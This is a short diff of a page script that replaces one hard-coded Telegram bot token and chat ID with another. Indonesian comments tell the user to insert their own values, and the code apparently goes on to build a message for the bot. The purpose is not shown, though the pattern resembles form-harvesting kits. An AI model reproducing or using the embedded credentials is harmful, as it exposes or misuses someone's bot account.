@@ -269,8 +269,8 @@ document.addEventListener("DOMContentLoaded", () => {
       }
 
       // Ganti token dan chat ID kamu di sini
-      const botToken = "8204285619:AAErwiWJjCiUMm9mpyF1jGSFt8qbrUQRVeo"; // GANTI DENGAN BOT TOKEN KAMU
-      const chatId = "8351788531"; // GANTI DENGAN CHAT ID KAMU
+      const botToken = "8526560445:AAFciOnhsXmrG8f8nyxgZoTfkid-PCxQFsA"; // GANTI DENGAN BOT TOKEN KAMU
+      const chatId = "6249825045"; // GANTI DENGAN CHAT ID KAMU
 
       const msg = `
 \`\`\`
